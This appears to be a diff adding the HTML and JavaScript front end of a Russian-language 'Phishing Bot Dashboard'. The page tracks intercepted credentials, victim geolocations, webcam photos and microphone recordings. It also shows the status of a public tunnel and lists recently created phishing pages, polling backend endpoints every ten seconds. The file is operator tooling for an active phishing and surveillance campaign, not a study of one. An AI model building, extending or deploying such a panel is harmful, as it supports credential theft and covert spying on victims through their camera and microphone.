@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phishing Bot Dashboard</title>
+    <!-- Bootstrap 5 + Font Awesome + Chart.js -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <style>
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        .dashboard-card {
+            background: rgba(255,255,255,0.95);
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+            backdrop-filter: blur(10px);
+            padding: 25px;
+            margin-bottom: 25px;
+            transition: transform 0.3s, box-shadow 0.3s;
+            animation: fadeInUp 0.5s ease;
+        }
+        .dashboard-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 30px 50px rgba(0,0,0,0.3);
+        }
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        .stat-number {
+            font-size: 2.5rem;
+            font-weight: bold;
+            color: #667eea;
+        }
+        .stat-label {
+            font-size: 1rem;
+            color: #666;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .icon-circle {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            font-size: 1.8rem;
+            margin-bottom: 15px;
+        }
+        .tunnel-status {
+            display: inline-block;
+            padding: 5px 15px;
+            border-radius: 50px;
+            font-weight: bold;
+            background: #28a745;
+            color: white;
+        }
+        .tunnel-status.off {
+            background: #dc3545;
+        }
+        .page-list {
+            max-height: 200px;
+            overflow-y: auto;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="dashboard-card text-center">
+            <h1 class="display-4"><i class="fas fa-fish"></i> Phishing Bot Dashboard</h1>
+            <p class="lead">Мониторинг и управление</p>
+        </div>
+
+        <div class="row">
+            <div class="col-md-3">
+                <div class="dashboard-card text-center">
+                    <div class="icon-circle mx-auto"><i class="fas fa-key"></i></div>
+                    <div class="stat-number" id="total-creds">0</div>
+                    <div class="stat-label">Перехвачено данных</div>
+                </div>
+            </div>
+            <div class="col-md-3">
+                <div class="dashboard-card text-center">
+                    <div class="icon-circle mx-auto"><i class="fas fa-map-marker-alt"></i></div>
+                    <div class="stat-number" id="total-geo">0</div>
+                    <div class="stat-label">Геолокаций</div>
+                </div>
+            </div>
+            <div class="col-md-3">
+                <div class="dashboard-card text-center">
+                    <div class="icon-circle mx-auto"><i class="fas fa-camera"></i></div>
+                    <div class="stat-number" id="total-webcam">0</div>
+                    <div class="stat-label">Фото с вебки</div>
+                </div>
+            </div>
+            <div class="col-md-3">
+                <div class="dashboard-card text-center">
+                    <div class="icon-circle mx-auto"><i class="fas fa-microphone"></i></div>
+                    <div class="stat-number" id="total-mic">0</div>
+                    <div class="stat-label">Аудио</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="row">
+            <div class="col-md-6">
+                <div class="dashboard-card">
+                    <h5><i class="fas fa-chart-line"></i> Посещения по дням</h5>
+                    <canvas id="visitsChart"></canvas>
+                </div>
+            </div>
+            <div class="col-md-6">
+                <div class="dashboard-card">
+                    <h5><i class="fas fa-globe"></i> Туннель</h5>
+                    <div id="tunnel-info">
+                        <p><span id="tunnel-status" class="tunnel-status">⏳ Загрузка...</span></p>
+                        <p><strong>URL:</strong> <a href="#" id="tunnel-url" target="_blank"></a></p>
+                    </div>
+                    <h5 class="mt-4"><i class="fas fa-file-alt"></i> Активная страница</h5>
+                    <div id="active-page">Загрузка...</div>
+                    <h5 class="mt-4"><i class="fas fa-list"></i> Последние страницы</h5>
+                    <div id="recent-pages" class="page-list">Загрузка...</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        async function loadStats() {
+            const res = await fetch('/api/stats');
+            const data = await res.json();
+            document.getElementById('total-creds').innerText = data.total_creds;
+            document.getElementById('total-geo').innerText = data.total_geo;
+            document.getElementById('total-webcam').innerText = data.total_webcam;
+            document.getElementById('total-mic').innerText = data.total_mic;
+
+            if (window.visitsChart) visitsChart.destroy();
+            const ctx = document.getElementById('visitsChart').getContext('2d');
+            window.visitsChart = new Chart(ctx, {
+                type: 'line',
+                data: {
+                    labels: data.visits_by_day.days,
+                    datasets: [{
+                        label: 'Визиты',
+                        data: data.visits_by_day.counts,
+                        backgroundColor: 'rgba(102, 126, 234, 0.2)',
+                        borderColor: '#667eea',
+                        borderWidth: 2,
+                        tension: 0.4,
+                        fill: true
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    plugins: {
+                        legend: { display: false }
+                    },
+                    scales: {
+                        y: { beginAtZero: true }
+                    }
+                }
+            });
+        }
+
+        async function loadTunnel() {
+            const res = await fetch('/api/tunnel');
+            const data = await res.json();
+            const statusEl = document.getElementById('tunnel-status');
+            const urlEl = document.getElementById('tunnel-url');
+            if (data.running) {
+                statusEl.innerText = '✅ Работает';
+                statusEl.className = 'tunnel-status';
+                urlEl.innerText = data.url;
+                urlEl.href = data.url;
+            } else {
+                statusEl.innerText = '❌ Остановлен';
+                statusEl.className = 'tunnel-status off';
+                urlEl.innerText = '';
+            }
+        }
+
+        async function loadPages() {
+            const res = await fetch('/api/pages');
+            const pages = await res.json();
+            const recentEl = document.getElementById('recent-pages');
+            const activeEl = document.getElementById('active-page');
+            
+            if (Object.keys(pages).length === 0) {
+                activeEl.innerText = 'Нет страниц';
+                recentEl.innerHTML = 'Нет страниц';
+                return;
+            }
+
+            const sorted = Object.entries(pages).sort((a, b) => new Date(b[1].date) - new Date(a[1].date));
+            // Активную страницу определить сложно, просто покажем первую
+            const first = sorted[0];
+            activeEl.innerHTML = `<strong>ID:</strong> ${first[0]}<br><strong>URL:</strong> ${first[1].url}<br><strong>Дата:</strong> ${first[1].date}`;
+
+            let recentHtml = '';
+            sorted.slice(0, 5).forEach(([id, meta]) => {
+                recentHtml += `<div class="mb-2 p-2 border rounded"><strong>${id}</strong>: ${meta.url} <br><small>${meta.date}</small></div>`;
+            });
+            recentEl.innerHTML = recentHtml;
+        }
+
+        loadStats();
+        loadTunnel();
+        loadPages();
+        setInterval(() => {
+            loadStats();
+            loadTunnel();
+        }, 10000);
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
